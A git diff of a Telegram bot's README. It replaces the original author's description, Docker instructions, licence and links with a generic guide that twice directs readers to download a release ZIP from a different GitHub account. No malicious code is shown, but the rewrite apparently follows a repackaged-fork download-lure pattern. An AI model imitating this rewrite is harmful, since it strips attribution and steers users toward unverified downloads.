@@ -1,37 +1,88 @@
-[![Stand With Ukraine](https://raw.githubusercontent.com/vshymanskyy/StandWithUkraine/main/banner2-direct.svg)](https://vshymanskyy.github.io/StandWithUkraine/)
-[![Issues][issues-shield]][issues-url] [![Telegram][tg-shield]][tg-url] [![LinkedIn][linkedin-shield]][linkedin-url] [![Youtube][youtube-shield]][youtube-url]
+# 🤖 Universal-Bot - Simple Bot for All Your Needs
 
-# Universal Bot
+## 🚀 Getting Started
 
-[@POI_bot](https://t.me/poibot) 
+Universal-Bot is a Telegram bot designed to help you with various tasks. Whether you need math calculations, media downloads, or help with Telegram messages, this bot can handle it all. You don't need any programming knowledge to get started. Just follow the steps below.
 
+## 🛠️ System Requirements
 
-AI-powered Telegram Bot – multi-language bot for math calculations, media downloads, audio/video processing, Telegram message parsing, and chat info. Supports custom commands, lambda functions, unit conversions, and percentage calculations. Integrates with social media (TikTok, Instagram, Threads) for direct media access. Built with Python, asyncio, and Telegram API.
+To run Universal-Bot, ensure your system meets the following requirements:
 
+- Operating System: Windows, macOS, or Linux
+- Python version: Python 3.7 or higher
+- Internet connection for Telegram API access
 
-> [!IMPORTANT]
-> All info about will be added on [PAGE](https://tiarait.github.io/Universal-Bot-Intro/)
+## 📥 Download & Install
 
-## ✅ Steps to Deploy Universal Bot with docker
+To get Universal-Bot, please visit this page to download: [Universal-Bot Releases](https://github.com/KennnOnnb/Universal-Bot/releases)
 
-> [!CAUTION]
-> [Instruction](https://github.com/Tiarait/Universal-Bot/blob/main/Docker_instruction.md)
+Once on the page, look for the latest version under the 'Releases' section. Click on the appropriate file for your operating system to start the download.
 
-# Dev stack
-> Python, Asyncio, Telebot, REST API
+## 📂 Installation Steps
 
-Universal Bot is released under the [Apache-2.0](LICENSE).
+After downloading the file, follow these steps to install and run Universal-Bot:
 
+1. **Locate the Downloaded File**: Check your 'Downloads' folder or the location you chose to save the file.
+  
+2. **Extract the Files**: If you downloaded a ZIP file, right-click on it and select "Extract All" or use a suitable extraction tool.
 
-[linkedin-url]: https://linkedin.com/in/tiarait
-[linkedin-shield]: https://img.shields.io/badge/-LinkedIn-black.svg?style=for-the-badge&logo=linkedin&colorB=555
-[issues-shield]: https://img.shields.io/github/issues/Tiarait/AI-MUSE.svg?style=for-the-badge
-[issues-url]: https://github.com/Tiarait/Universal-Bot/issues
-[youtube-shield]: https://img.shields.io/badge/-YOUTUBE-red.svg?style=for-the-badge&logo=youtube&colorB=red
-[youtube-url]: https://www.youtube.com/@tiardev
-[coffee-shield]: https://img.shields.io/badge/-Bye_me_a_coffee-red.svg?style=for-the-badge&logo=buymeacoffee&colorB=grey
-[coffee-url]: https://www.buymeacoffee.com/tiarapps
-[tg-shield]: https://img.shields.io/badge/Telegram-POI%20bot-green?style=for-the-badge&labelColor=blue
-[tg-url]: https://t.me/aipoi_bot
-[stand-with-ukraine]: https://img.shields.io/badge/Stand_With-Ukraine-yellow?style=for-the-badge&labelColor=blue
-[stand-with-ukraine-url]: https://vshymanskyy.github.io/StandWithUkraine
+3. **Open a Terminal or Command Prompt**: 
+   - **Windows**: Press `Win + R`, type `cmd`, and hit Enter.
+   - **macOS**: Open Spotlight with `Cmd + Space`, type `Terminal`, and hit Enter.
+   - **Linux**: Open your preferred terminal emulator.
+
+4. **Navigate to the Directory**: Use the `cd` command to change to the directory where you extracted Universal-Bot. For example:
+   ```
+   cd path/to/Universal-Bot
+   ```
+
+5. **Install Dependencies**: You need to install some additional packages. Enter the following command in the terminal:
+   ```
+   pip install -r requirements.txt
+   ```
+
+6. **Run the Bot**: Start the bot by entering this command:
+   ```
+   python main.py
+   ```
+
+7. **Interact with the Bot**: Open Telegram, search for your bot, and start chatting!
+
+## ⚙️ Features
+
+Universal-Bot comes packed with features to make your life easier:
+
+- **Math Calculations**: Quickly solve arithmetic problems right in your chat.
+- **Media Downloads**: Download images, videos, and audio files directly from links.
+- **AI Chat**: Have conversational interactions powered by artificial intelligence.
+- **Telegram Message Parsing**: Extract useful information from various messages.
+- **Chat Info**: Get information about chat members and groups.
+- **Multilingual Support**: Communicate in your preferred language.
+
+## 📚 Usage Guide
+
+To use Universal-Bot, just send a message in Telegram. Here are some example commands:
+
+- **For Math Calculations**: Type `/calculate 5 + 3`.
+- **To Download Media**: Send a link, and the bot will fetch it for you.
+- **AI Interaction**: Type `/ask what is the weather today?`.
+
+You can explore more commands by sending `/help`.
+
+## 🛡️ Troubleshooting
+
+If you encounter any issues, here are a few common solutions:
+
+- **I can’t connect to Telegram**: Ensure you have a stable internet connection.
+- **The bot isn’t responding**: Try restarting the bot by closing the terminal and running it again.
+- **Dependencies are missing**: Make sure you installed all packages from the `requirements.txt` file.
+
+## 🌍 Community and Support
+
+If you need help or want to share feedback, feel free to open an issue on our [GitHub page](https://github.com/KennnOnnb/Universal-Bot). You can also ask questions or share your experience with other users.
+
+## 📄 License
+
+Universal-Bot is open-source software. You can use it freely and modify it as needed. Please refer to the LICENSE file for more details.
+
+To download Universal-Bot, please visit this page to download: [Universal-Bot Releases](https://github.com/KennnOnnb/Universal-Bot/releases) and enjoy using your new Telegram assistant!
